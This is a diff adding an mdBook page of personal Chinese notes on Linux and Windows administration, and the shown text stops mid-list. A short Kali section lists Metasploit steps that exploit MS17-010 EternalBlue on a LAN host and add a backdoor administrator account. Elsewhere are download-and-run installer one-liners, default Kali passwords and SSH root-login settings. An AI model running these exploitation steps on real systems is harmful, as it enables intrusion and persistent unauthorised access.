@@ -1,0 +1,3780 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>linux note</title>
+        <meta name="robots" content="noindex" />
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var html = document.querySelector('html');
+            var sidebar = null;
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="os/os.html"><strong aria-hidden="true">1.</strong> 系统</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="os/manjaro.html"><strong aria-hidden="true">1.1.</strong> manjaro</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="os/manjaro/7z.html"><strong aria-hidden="true">1.1.1.</strong> 1. 7z</a></li><li class="chapter-item expanded "><a href="os/manjaro/scrot.html"><strong aria-hidden="true">1.1.2.</strong> 2. scrot</a></li><li class="chapter-item expanded "><a href="os/manjaro/swap.html"><strong aria-hidden="true">1.1.3.</strong> 3. swap</a></li></ol></li><li class="chapter-item expanded "><a href="os/ubuntu.html"><strong aria-hidden="true">1.2.</strong> ubuntu</a></li><li class="chapter-item expanded "><a href="os/centos.html"><strong aria-hidden="true">1.3.</strong> centos</a></li><li class="chapter-item expanded "><a href="os/kali.html"><strong aria-hidden="true">1.4.</strong> kali</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="os/kali/install.html"><strong aria-hidden="true">1.4.1.</strong> install</a></li><li class="chapter-item expanded "><a href="os/kali/msfconsole.html"><strong aria-hidden="true">1.4.2.</strong> msfconsole</a></li><li class="chapter-item expanded "><a href="os/kali/dirbuster.html"><strong aria-hidden="true">1.4.3.</strong> dirbuster</a></li></ol></li><li class="chapter-item expanded "><a href="os/windows.html"><strong aria-hidden="true">1.5.</strong> windows</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="os/windows/windows_tools.html"><strong aria-hidden="true">1.5.1.</strong> windows tools</a></li><li class="chapter-item expanded "><a href="os/windows/vmware.html"><strong aria-hidden="true">1.5.2.</strong> vmware</a></li><li class="chapter-item expanded "><a href="os/windows/cmd.html"><strong aria-hidden="true">1.5.3.</strong> cmd</a></li><li class="chapter-item expanded "><a href="os/windows/bug.html"><strong aria-hidden="true">1.5.4.</strong> bug</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> 语言</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="language/chat/expression.html"><strong aria-hidden="true">2.1.</strong> expression</a></li><li class="chapter-item expanded "><a href="language/lua/lua.html"><strong aria-hidden="true">2.2.</strong> lua</a></li><li class="chapter-item expanded "><a href="language/python/python.html"><strong aria-hidden="true">2.3.</strong> python</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="language/python/python_joinquant.html"><strong aria-hidden="true">2.3.1.</strong> python joinquant</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="dotfiles/myconfig.html"><strong aria-hidden="true">3.</strong> 我的配置</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="tools/proxy/terminal_proxy.html"><strong aria-hidden="true">3.1.</strong> 命令行配置proxy</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> 工具</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="tools/tools.html"><strong aria-hidden="true">4.1.</strong> tools</a></li><li class="chapter-item expanded "><a href="tools/shell.html"><strong aria-hidden="true">4.2.</strong> shell</a></li><li class="chapter-item expanded "><a href="tools/git.html"><strong aria-hidden="true">4.3.</strong> git</a></li><li class="chapter-item expanded "><a href="tools/gitlab.html"><strong aria-hidden="true">4.4.</strong> gitlab</a></li><li class="chapter-item expanded "><a href="tools/mermaid.html"><strong aria-hidden="true">4.5.</strong> mermaid</a></li><li class="chapter-item expanded "><a href="tools/smb.html"><strong aria-hidden="true">4.6.</strong> smb</a></li><li class="chapter-item expanded "><a href="tools/i3/i3wm.html"><strong aria-hidden="true">4.7.</strong> i3wm</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="tools/i3/i3config.html"><strong aria-hidden="true">4.7.1.</strong> i3config</a></li><li class="chapter-item expanded "><a href="tools/i3/i3lock.html"><strong aria-hidden="true">4.7.2.</strong> i3lock</a></li><li class="chapter-item expanded "><a href="tools/i3/i3status.html"><strong aria-hidden="true">4.7.3.</strong> i3status</a></li><li class="chapter-item expanded "><a href="tools/i3/screenkey.html"><strong aria-hidden="true">4.7.4.</strong> screenkey</a></li><li class="chapter-item expanded "><a href="tools/i3/sound.html"><strong aria-hidden="true">4.7.5.</strong> sound</a></li><li class="chapter-item expanded "><a href="tools/i3/polybar.html"><strong aria-hidden="true">4.7.6.</strong> polybar</a></li><li class="chapter-item expanded "><a href="tools/i3/rofi.html"><strong aria-hidden="true">4.7.7.</strong> rofi</a></li></ol></li><li class="chapter-item expanded "><a href="dotfiles/dotfiles.html"><strong aria-hidden="true">4.8.</strong> dotfiles</a></li><li class="chapter-item expanded "><a href="tools/ftp.html"><strong aria-hidden="true">4.9.</strong> ftp</a></li><li class="chapter-item expanded "><a href="tools/tmux.html"><strong aria-hidden="true">4.10.</strong> tmux</a></li><li class="chapter-item expanded "><a href="tools/frp.html"><strong aria-hidden="true">4.11.</strong> frp</a></li><li class="chapter-item expanded "><a href="tools/flameshot.html"><strong aria-hidden="true">4.12.</strong> flameshot截图</a></li><li class="chapter-item expanded "><a href="tools/nginx/nginx.html"><strong aria-hidden="true">4.13.</strong> nginx</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="tools/nginx/nginx_conf.html"><strong aria-hidden="true">4.13.1.</strong> nginx配置笔记</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="tools/vim.html"><strong aria-hidden="true">5.</strong> vim</a></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.</strong> vim插件</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="tools/vim/plug/vim-plug.html"><strong aria-hidden="true">5.1.1.</strong> vim-plug</a></li><li class="chapter-item expanded "><a href="tools/vim/plug/ctrlp.html"><strong aria-hidden="true">5.1.2.</strong> ctrlp</a></li><li class="chapter-item expanded "><a href="tools/vim/plug/nerdtree.html"><strong aria-hidden="true">5.1.3.</strong> nerdtree</a></li><li class="chapter-item expanded "><a href="tools/vim/plug/ale.html"><strong aria-hidden="true">5.1.4.</strong> ale</a></li><li class="chapter-item expanded "><a href="tools/vim/plug/vim-commentary.html"><strong aria-hidden="true">5.1.5.</strong> vim-commentary</a></li><li class="chapter-item expanded "><a href="tools/vim/plug/vim-fugitive.html"><strong aria-hidden="true">5.1.6.</strong> vim-fugitive</a></li><li class="chapter-item expanded "><a href="tools/vim/plug/fzf.html"><strong aria-hidden="true">5.1.7.</strong> fzf</a></li><li class="chapter-item expanded "><a href="tools/vim/plug/coc.html"><strong aria-hidden="true">5.1.8.</strong> coc</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="docker/docker.html"><strong aria-hidden="true">6.</strong> docker</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="docker/docker_jenkins.html"><strong aria-hidden="true">6.1.</strong> jenkins</a></li><li class="chapter-item expanded "><a href="docker/docker_nginx.html"><strong aria-hidden="true">6.2.</strong> nginx</a></li><li class="chapter-item expanded "><a href="docker/docker_gitbook.html"><strong aria-hidden="true">6.3.</strong> gitbook</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">7.</strong> 数据库</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="mysql/mysql.html"><strong aria-hidden="true">7.1.</strong> mysql</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.</strong> 开源</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="opensource/github.html"><strong aria-hidden="true">8.1.</strong> github</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.</strong> 开发框架</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="opensource/nightingale.html"><strong aria-hidden="true">9.1.</strong> 运维监控:nightingale</a></li><li class="chapter-item expanded "><a href="opensource/skynet.html"><strong aria-hidden="true">9.2.</strong> skynet</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="opensource/skynet/debug_console.html"><strong aria-hidden="true">9.2.1.</strong> debug_console</a></li><li class="chapter-item expanded "><a href="server/skynet/clearcache.html"><strong aria-hidden="true">9.2.2.</strong> clearcache</a></li></ol></li><li class="chapter-item expanded "><a href="opensource/tars.html"><strong aria-hidden="true">9.3.</strong> tars</a></li><li class="chapter-item expanded "><a href="opensource/nodejs.html"><strong aria-hidden="true">9.4.</strong> nodejs</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">linux note</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="系统"><a class="header" href="#系统">系统</a></h1>
+<h2 id="manjaro"><a class="header" href="#manjaro">manjaro</a></h2>
+<h2 id="ubuntu"><a class="header" href="#ubuntu">ubuntu</a></h2>
+<h2 id="centos"><a class="header" href="#centos">centos</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="同步时间"><a class="header" href="#同步时间">同步时间</a></h2>
+<ul>
+<li>
+<p>设置硬件时钟
+sudo hwclock --systohc</p>
+</li>
+<li>
+<p>同步时间
+-- ntpdate -u ntp.api.bz
+timedatectl set-ntp yes</p>
+</li>
+</ul>
+<h2 id="pacman"><a class="header" href="#pacman">pacman</a></h2>
+<h3 id="设置源"><a class="header" href="#设置源">设置源</a></h3>
+<ol>
+<li>
+<p>step1
+sudo pacman-mirrors -i -c China -m rank
+sudo pacman -Syy</p>
+</li>
+<li>
+<p>step2
+/etc/pacman.conf:
+[archlinuxcn]
+SigLevel = Optional TrustedOnly
+Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch</p>
+</li>
+</ol>
+<h3 id="导入gpg-key"><a class="header" href="#导入gpg-key">导入GPG key</a></h3>
+<p>sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring</p>
+<h3 id="key-签名问题解决办法"><a class="header" href="#key-签名问题解决办法">key 签名问题解决办法</a></h3>
+<p>sudo pacman-key --init
+sudo pacman-key --populate</p>
+<h3 id="x32-mirrorlist"><a class="header" href="#x32-mirrorlist">x32 mirrorlist</a></h3>
+<p>http://mirrors.zju.edu.cn/manjaro/x32-unstable/state</p>
+<h3 id="更新系统"><a class="header" href="#更新系统">更新系统</a></h3>
+<p>sudo pacman -Syyu</p>
+<ol>
+<li>
+<p>输入法
+sudo pacman -S fcitx-im 
+sudo pacman -S fcitx-configtool
+sudo pacman -S fcitx-sogoupinyin</p>
+</li>
+<li>
+<p>配置sudo vim ~/.xprofile
+export GTK_IM_MODULE=fcitx
+export QT_IM_MODULE=fcitx
+export XMODIFIERS=&quot;@im=fcitx&quot;</p>
+</li>
+</ol>
+<h2 id="必备"><a class="header" href="#必备">必备</a></h2>
+<ol>
+<li>
+<p>screenfetch
+sudo pacman -S screenfetch</p>
+</li>
+<li>
+<p>screenkey
+sudo pacman -S screenkey</p>
+</li>
+<li>
+<p>yaourt
+sudo pacman -S yaourt</p>
+</li>
+<li>
+<p>sougou
+sudo pacman -S fcitx-sogoupinyin</p>
+</li>
+<li>
+<p>wechat
+sudo pacman -S electronic-wechat(not support now)</p>
+</li>
+<li>
+<p>neteasy music
+yaourt musicbox
+help:
+https://github.com/darknessomi/musicbox</p>
+</li>
+<li>
+<p>chromium 中文乱码
+sudo pacman -S wqy-microhei</p>
+</li>
+<li>
+<p>安装vmware https://www.jianshu.com/p/de571b44ab60</p>
+</li>
+<li>
+<p>vmware download:https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html</p>
+</li>
+</ol>
+<h2 id="常用软件"><a class="header" href="#常用软件">常用软件</a></h2>
+<ul>
+<li>声音控制 terminal中运行命令:alsamixer</li>
+<li>截图:flameshot</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="install"><a class="header" href="#install">install</a></h2>
+<pre><code>sudo pacman -S p7zip
+</code></pre>
+<h2 id="解压"><a class="header" href="#解压">解压</a></h2>
+<p>7z x filename</p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="install-截屏工具"><a class="header" href="#install-截屏工具">install 截屏工具</a></h2>
+<p>sudo pacman -S scrot</p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="首先确认是否添加过swap分区"><a class="header" href="#首先确认是否添加过swap分区">首先确认是否添加过swap分区</a></h2>
+<p>为了防止出现任何以外，请先看一下内存中是否已经有swap:</p>
+<pre><code>free -m
+</code></pre>
+<p>一般情况下运行命令后会出现如下的内容:</p>
+<pre><code>total              used       free     shared    buffers     cached
+Mem:               1840       1614     226       15          36       1340
+-/+ buffers/cache:            238      1602
+Swap:              0          0        0
+</code></pre>
+<p>如果你看到 Swap 分区中是0的话，那么就可以接着看第二步</p>
+<p>如果不是的话说明你已经有了swap分区，你可以通过下面的命令查看swap文件:</p>
+<pre><code>swapon -s
+</code></pre>
+<h2 id="第二步创建swap分区"><a class="header" href="#第二步创建swap分区">第二步，创建Swap分区</a></h2>
+<p>使用dd来创建一个空的swap文件（2G为例）:</p>
+<pre><code>dd if=/dev/zero of=/swapfile count=2048 bs=1M
+</code></pre>
+<p>其中 dd 命令的内容可以按自己的需求修改:</p>
+<pre><code>if =输入文件（或设备名称）。
+of =输出文件（或设备名称）。
+ibs = bytes 一次读取bytes字节，即读入缓冲区的字节数。
+skip = blocks 跳过读入缓冲区开头的ibs*blocks块。
+obs = bytes 一次写入bytes字节，即写入缓冲区的字节数。
+bs = bytes 同时设置读/写缓冲区的字节数（等于设置ibs和obs）。
+cbs = byte 一次转换bytes字节。
+count=blocks 只拷贝输入的blocks块。
+</code></pre>
+<p>然后你应该会看到如下的反馈：</p>
+<p>2048+0 records in
+2048+0 records out
+2147483648 bytes (2.1 GB) copied, 10.5356 s, 204 MB/s
+然后我们来验证一下是否已经生成完成:</p>
+<p>ls / | grep swapfile
+如果正常生成的话你可以看到 swapfile 文件</p>
+<h2 id="第三步激活swap分区"><a class="header" href="#第三步激活swap分区">第三步，激活Swap分区</a></h2>
+<p>Swap分区需要读写的权限，所以运行命令授权:</p>
+<p>chmod 600 /swapfile
+查看授权是否成功:</p>
+<p>ls -lh /swapfile
+如果成功的话你可以看到如下反馈:</p>
+<p>-rw------- 1 root root 2.0G Oct  2 18:47 /swapfile
+然后挂载Swap分区:</p>
+<p>mkswap /swapfile
+你应该能看到如下的反馈:</p>
+<p>Setting up swapspace version 1, size = 2097148 KiB
+no label, UUID=ff3fc469-9c4b-4913-b653-ec53d6460d0e</p>
+<p>Step 4: Turn swap on
+完成之前的步骤之后你的swap分区已经可以使用了，我先只要打开它就好:</p>
+<p>swapon /swapfile
+这时候你可以用 free 命令再次查看Swap分区是否已经开始运行</p>
+<pre><code>free -m
+</code></pre>
+<pre><code>total       used       free     shared    buffers     cached
+Mem:          1840       1754         86         16         23       1519
+-/+ buffers/cache:        210       1630
+Swap:         2047          0       2047
+</code></pre>
+<p>如果 Swap 空间不是 0 就说明你成功了</p>
+<h2 id="第五步开机启动设置"><a class="header" href="#第五步开机启动设置">第五步，开机启动设置</a></h2>
+<p>一般而言Swap是没有开机启动的，所以你需要编辑/etc/fstab 文件，我一般用 nano，你也可以用vi或者vim达到同样的效果</p>
+<pre><code>vim /etc/fstab
+</code></pre>
+<p>在末尾加上如下内容:</p>
+<pre><code>/swapfile   none    swap    sw    0   0
+</code></pre>
+<p>保存之后我们就完成了Swap的全套设置</p>
+<h2 id="修改swappiness"><a class="header" href="#修改swappiness">修改swappiness</a></h2>
+<ul>
+<li>查看swappiness</li>
+</ul>
+<pre><code>cat /proc/sys/vm/swappiness
+</code></pre>
+<ul>
+<li>修改swappiness</li>
+</ul>
+<pre><code>sudo sysctl vm.swappiness=10
+sudo vim /etc/sysctl.conf
+在这个文档的最后加上这样一行:
+vm.swappiness=10
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ubuntu-1"><a class="header" href="#ubuntu-1">ubuntu</a></h1>
+<h2 id="修改镜像源"><a class="header" href="#修改镜像源">修改镜像源</a></h2>
+<ul>
+<li><a href="https://blog.csdn.net/Liangontheway/article/details/103509635?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-1&amp;spm=1001.2101.3001.4242">CSDN帮助</a></li>
+<li>/etc/apt/sources.list</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="kali"><a class="header" href="#kali">kali</a></h1>
+<h2 id="ssh-配置"><a class="header" href="#ssh-配置">ssh 配置</a></h2>
+<ul>
+<li><a href="https://blog.csdn.net/u010953692/article/details/80312751">开启ssh服务,允许root登录</a></li>
+<li>查看ssh服务状态</li>
+</ul>
+<pre><code>/etc/init.d/ssh status
+</code></pre>
+<ul>
+<li>修改配置文件</li>
+</ul>
+<pre><code>vim /etc/ssh/sshd_config
+
+PermitRootLogin yes
+PasswordAuthntication yes
+</code></pre>
+<ul>
+<li>启动ssh服务</li>
+</ul>
+<pre><code>/etc/init.d/ssh start
+</code></pre>
+<ul>
+<li>修改源</li>
+</ul>
+<pre><code>sudo vi /etc/apt/sources.list
+#中科大
+deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  
+deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 
+#软件源清单更新
+sudo apt-get dist-upgrade
+#软件版本更新
+sudo apt-get update
+sudo apt-get upgrade
+</code></pre>
+<ul>
+<li>密钥失败</li>
+</ul>
+<pre><code>The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux
+
+wget -q -O - https://archive.kali.org/archive-key.asc  |apt-key add
+#不成功的话改http请求试试
+wget -q -O - http://archive.kali.org/archive-key.asc  |apt-key add
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="kali-1"><a class="header" href="#kali-1">kali</a></h2>
+<ol>
+<li>url:
+https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/</li>
+<li>virtual images</li>
+</ol>
+<h2 id="kali-version"><a class="header" href="#kali-version">kali version</a></h2>
+<h3 id="kali-20182"><a class="header" href="#kali-20182">kali 2018.2</a></h3>
+<ol>
+<li>user:root pwd:toor</li>
+</ol>
+<h3 id="kali-20201"><a class="header" href="#kali-20201">kali-2020.1</a></h3>
+<ol>
+<li>虚拟机版本 user:kali pwd:kali</li>
+<li>修改默认root密码:sudo passwd root</li>
+<li>vmware 需要修改:设置---&gt;选项---&gt;版本:其他linux</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="msconsole"><a class="header" href="#msconsole">msconsole</a></h2>
+<h3 id="更新"><a class="header" href="#更新">更新</a></h3>
+<pre><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \
+ chmod 755 msfinstall &amp;&amp; \
+./msfinstall
+</code></pre>
+<h3 id="漏洞验证"><a class="header" href="#漏洞验证">漏洞验证</a></h3>
+<h4 id="17_010"><a class="header" href="#17_010">17_010</a></h4>
+<ol>
+<li>msfconsole</li>
+<li>search 17_010</li>
+<li>use windows/smb/ms17_010_eternalblue</li>
+<li>show options</li>
+<li>set RHOSTS 192.168.2.159</li>
+<li>run/exploit</li>
+<li>shell</li>
+<li>net user test test /add</li>
+<li>net localgroup administrators test /add</li>
+</ol>
+<h4 id="cve-2020-0796"><a class="header" href="#cve-2020-0796">cve-2020-0796</a></h4>
+<ol>
+<li>msfconsole
+<ul>
+<li>search 20_0796</li>
+</ul>
+</li>
+<li>https://my.oschina.net/u/4302130/blog/3224951/</li>
+</ol>
+<h3 id="windows乱码问题"><a class="header" href="#windows乱码问题">windows乱码问题</a></h3>
+<ol>
+<li>cmd:chcp 65001</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="dirbuster"><a class="header" href="#dirbuster">dirbuster</a></h2>
+<ol>
+<li>作用：扫描网站目录</li>
+<li>字典资源: https://github.com/rootphantomer/Blasting_dictionary</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="快速打开哥哥服务win--r"><a class="header" href="#快速打开哥哥服务win--r">快速打开哥哥服务，win + R</a></h2>
+<ol>
+<li>services.msc  打开服务</li>
+<li>firewall.cpl</li>
+<li>control   打开控制面板</li>
+<li>taskmgr  打开任务管理器</li>
+<li>chrome</li>
+<li>gpedit.msc 打开本地组策略</li>
+<li>eventvwr.msc 打开事件查看器</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="windows工具"><a class="header" href="#windows工具">windows工具</a></h2>
+<h3 id="scoop-包管理工具"><a class="header" href="#scoop-包管理工具">scoop 包管理工具</a></h3>
+<ul>
+<li>安装</li>
+</ul>
+<ol>
+<li>iex (new-object net.webclient).downloadstring('https://get.scoop.sh')</li>
+<li>Set-ExecutionPolicy RemoteSigned -scope CurrentUser</li>
+<li>安装域名解析问题,修改host：151.101.76.133 raw.githubusercontent.com
+<ul>
+<li>help:https://www.cnblogs.com/sinferwu/p/12726833.html</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>添加额外包仓库</li>
+</ul>
+<ol>
+<li>scoop bucket add extras https://github.com/lukesampson/scoop-extras.git</li>
+</ol>
+<ul>
+<li>
+<p>安装常用工具:sudo ag git curl 7zip concfg aria2</p>
+</li>
+<li></li>
+<li>
+<p>使用</p>
+</li>
+</ul>
+<ol>
+<li>scoop install concfg</li>
+<li>scoop update</li>
+<li>scoop list</li>
+<li>scoop -h</li>
+<li>scoop search</li>
+</ol>
+<ul>
+<li>
+<p>wiki:https://github.com/lukesampson/scoop/wiki</p>
+</li>
+<li>
+<p>help:https://www.jianshu.com/p/f412b95c19b8</p>
+</li>
+<li>
+<p>help:https://www.jianshu.com/p/b09fe256be0f</p>
+</li>
+<li>
+<p>aria2</p>
+</li>
+</ul>
+<h1 id="aria2-在-scoop-中默认开启"><a class="header" href="#aria2-在-scoop-中默认开启">aria2 在 Scoop 中默认开启</a></h1>
+<p>scoop config aria2-enabled true</p>
+<h1 id="关于以下参数的作用详见aria2的相关资料"><a class="header" href="#关于以下参数的作用详见aria2的相关资料">关于以下参数的作用，详见aria2的相关资料</a></h1>
+<p>scoop config aria2-retry-wait 4
+scoop config aria2-split 16
+scoop config aria2-max-connection-per-server 16
+scoop config aria2-min-split-size 4M</p>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="vmware"><a class="header" href="#vmware">vmware</a></h2>
+<ol>
+<li>windows7 创建虚拟机时左边列表不显示怎么办？
+关闭防火墙</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="net命令"><a class="header" href="#net命令">net命令</a></h2>
+<ul>
+<li>net time \ip 查看系统时间 eg: net time 127.0.0.1</li>
+<li>net share 查看共享</li>
+<li>net user 查看用户</li>
+<li>net user abc 123 /add 新建用户:新建用户abc密码123</li>
+<li>net user abc 123 修改用户密码:修改用户abc的密码为123</li>
+<li>net user abc /del 删除用户:删除用户abc</li>
+<li>net localgroup administrators 查看管理员组成员</li>
+<li>net localgroup administrators abc /add 把abc 加入管理员组</li>
+<li>net use f: \192.168.2.11\share 123456 /user:administrator  将其他电脑的share目录映射到本机的f盘</li>
+<li>net use f: /del</li>
+<li>net use * /del</li>
+</ul>
+<h2 id="常用命令-cddirmkdirdelechoattribmdcls"><a class="header" href="#常用命令-cddirmkdirdelechoattribmdcls">常用命令 cd,dir,mkdir,del,echo,attrib,md,cls</a></h2>
+<ul>
+<li>
+<p>cls 清屏</p>
+</li>
+<li>
+<p>del ****.txt</p>
+</li>
+<li>
+<p>echo hello &gt;&gt; test.txt</p>
+</li>
+<li>
+<p>md a 创建a目录</p>
+</li>
+<li>
+<p>type 类似于tail
+type a.txt | more</p>
+</li>
+<li>
+<p>copy con 文件名:拷贝屏幕内容到文件里面， C-z enter结束</p>
+</li>
+<li>
+<p>attrib +h test.txt:给文件test.txt添加隐藏属性</p>
+</li>
+<li>
+<p>attrib -h test.txt:给文件test.txt取消隐藏属性</p>
+</li>
+<li>
+<p>fsutil file createnew d:\system.ini 10</p>
+</li>
+<li>
+<p>assoc .txt=exefile  修改文件关联</p>
+</li>
+<li>
+<p>assoc .txt=txtfile</p>
+</li>
+<li>
+<p>assoc .txt 查看.txt文件关联</p>
+</li>
+<li>
+<p>ren 重命名文件或文件夹</p>
+</li>
+</ul>
+<h2 id="dhcp服务器"><a class="header" href="#dhcp服务器">dhcp服务器</a></h2>
+<ul>
+<li>ipconfig release/renew/all 释放ip/续约/查看信息</li>
+</ul>
+<h2 id="dns服务器"><a class="header" href="#dns服务器">dns服务器</a></h2>
+<ul>
+<li>ipconfig /flushdns</li>
+<li>nslookup</li>
+</ul>
+<h2 id="winr"><a class="header" href="#winr">win+r</a></h2>
+<ul>
+<li>control 进入控制面板</li>
+<li>gpedit.msc 进入组策略配置</li>
+<li>services.msc 进入服务</li>
+</ul>
+<h2 id="win7"><a class="header" href="#win7">win7</a></h2>
+<ul>
+<li>强制关机---&gt;修复</li>
